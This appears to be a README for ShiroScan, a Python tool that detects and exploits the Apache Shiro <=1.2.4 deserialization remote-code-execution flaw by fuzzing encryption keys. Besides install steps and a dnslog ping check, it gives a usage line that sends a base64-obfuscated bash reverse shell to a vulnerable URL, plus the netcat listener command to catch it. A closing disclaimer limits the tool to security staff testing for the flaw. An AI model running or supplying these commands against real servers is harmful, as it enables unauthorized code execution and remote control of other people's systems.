# ShiroScan
Shiro&lt;=1.2.4反序列化，一键检测工具

```
集成21个key进行fuzz
```

如果有帮助，请点个star哦，blog：www.svenbeast.com

## 安装
    git clone https://github.com/3ecurity/ShiroScan.git
    
    cd ShiroScan
    
    pip3 install -r requirments.txt     

    Usage：python3 shiro_rce.py  -h
    
## 使用

http://www.dnslog.cn/   验证推荐使用这个dnslog平台，速度比ceye.io要快很多
执行的命令带空格记得用""引起来

    usage：python3 shiro_rce.py  http://shiro_vul_url.com  "ping xxx.dnslog.cn"
    
7个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为编码还不够多
请自行收集编码，在moule下的源代码中自行添加方法即可

反弹shell命令：

    python3 shiro_rce.py http://2.2.2.2:8180 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"

服务器监听8999端口：

    nc -lvvp 8999

解析：

    http://2.2.2.2:8180 为存在漏洞的网址

    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40Lzg5OTkgMD4mMQ==}|{base64,-d}|{bash,-i} 为需要执行的命令
    
🧐

## 不推荐当做exp使用，效率问题
## 仅供安全人员验证,测试是否存在此漏洞

## 可能会遇到安装Crypto模块问题，使用下面命令即可：

Windows安装Crypto：

    pip3 install crypto pycryptodome
    pip3 uninstall crypto pycryptodome
    pip3 install pycryptodome

linux环境则直接安装pycryptodome：

    pip install pycryptodome
